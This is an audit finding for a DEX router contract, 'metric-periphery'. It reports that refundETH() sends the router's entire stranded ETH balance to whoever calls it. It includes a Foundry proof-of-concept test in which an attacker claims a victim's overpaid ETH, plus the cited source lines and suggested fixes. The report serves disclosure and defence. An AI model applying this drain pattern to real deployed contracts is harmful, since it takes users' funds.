Audit Report

## Title
`refundETH` Sends Full Router ETH Balance to Any Caller, Enabling Cross-Transaction ETH Theft — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary

`refundETH()` unconditionally transfers `address(this).balance` to `msg.sender` with no record of who deposited ETH. When a user overpays native ETH in a `multicall{value}` call without appending `refundETH()`, the surplus ETH persists on the router after the transaction ends. Any subsequent caller can invoke `refundETH()` in a standalone transaction and receive all stranded ETH, including funds that belonged to prior users.

## Finding Description

`pay()` in `PeripheryPayments` handles WETH-leg swaps by consuming native ETH first. When `address(this).balance >= value`, exactly `value` wei is wrapped and transferred to the pool; the remainder (`msg.value - amountIn`) stays on the router with no refund and no revert: [1](#0-0) 

The `receive()` guard prevents arbitrary ETH deposits from external senders: [2](#0-1) 

But it does not prevent ETH from accumulating via `msg.value` on payable entry points such as `exactInputSingle` or `multicall`. After the transaction ends, `refundETH()` has no memory of the depositor and sends the entire current balance to whoever calls it next: [3](#0-2) 

## Impact Explanation

A user who calls `multicall{value: X}([exactInputSingle(amountIn: Y)])` with `X > Y` and omits `refundETH()` from the call array leaves `X - Y` ETH stranded on the router. Any address can immediately call `refundETH()` in a separate transaction and receive those funds. This is a direct, unconditional loss of user principal with no recovery path. The impact qualifies as a High/Critical direct loss of user principal under the allowed impact gate.

## Likelihood Explanation

- `IMetricOmmSimpleRouter` carries no NatSpec warning that callers must append `refundETH()` when overpaying ETH. [4](#0-3) 
- The only documentation of this requirement appears in the unrelated `IMetricOmmPoolLiquidityAdder` interface. [5](#0-4) 
- Integrators and front-ends that send a round ETH value (e.g., `1 ether`) for a swap that costs less will routinely trigger this condition.
- The attacker requires no privilege, no front-running, and no special setup — a simple `refundETH()` call after any stranding transaction suffices.
- The existing test `test_multicall_ethInput_exactInputSingle_refundsUnusedEth` demonstrates the correct pattern but the router enforces nothing — omitting `refundETH()` silently strands ETH. [6](#0-5) 

## Recommendation

Add a `msg.sender` parameter to `refundETH()` (or track depositor per-call via transient storage) so that only the originating caller can reclaim their ETH. Alternatively, enforce that `pay()` reverts if `msg.value` exceeds `amountIn` when `payer != address(this)`, preventing stranding at the source.

## Proof of Concept

```solidity
function test_refundETH_stealsStrandedEth() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim overpays: sends 2 ETH but amountIn is only 1000 wei; omits refundETH
    vm.prank(victim);
    bytes[] memory calls = new bytes[](1);
    calls[0] = abi.encodeWithSelector(
        router.exactInputSingle.selector,
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool), tokenIn: address(weth), tokenOut: address(token1),
            zeroForOne: true, amountIn: 1000, amountOutMinimum: 0,
            recipient: victim, deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
        })
    );
    router.multicall{value: 2 ether}(calls);
    // 2 ether - 1000 wei now stranded on router

    // Attacker drains it
    uint256 before = attacker.balance;
    vm.prank(attacker);
    router.refundETH();
    assertGt(attacker.balance, before, "attacker stole victim ETH");
    assertEq(address(router).balance, 0);
}
```

The `pay()` call wraps exactly 1000 wei: [7](#0-6)  leaving `2 ether - 1000` on the router, which `refundETH()` then delivers entirely to the attacker. [3](#0-2)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-78)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/interfaces/IMetricOmmSimpleRouter.sol (L164-175)
```text
  // ============ Mutating: exact input ============

  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);

  function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);

  // ============ Mutating: exact output ============

  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);

  function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn);
}
```

**File:** metric-periphery/contracts/interfaces/IMetricOmmPoolLiquidityAdder.sol (L15-17)
```text
/// @dev Native ETH input uses the same multicall pattern as the swap router: send ETH with the add call (or
///      `multicall{value}`) when the pool's WETH leg is token0 or token1; unused ETH can be reclaimed via
///      `refundETH` in the same multicall.
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
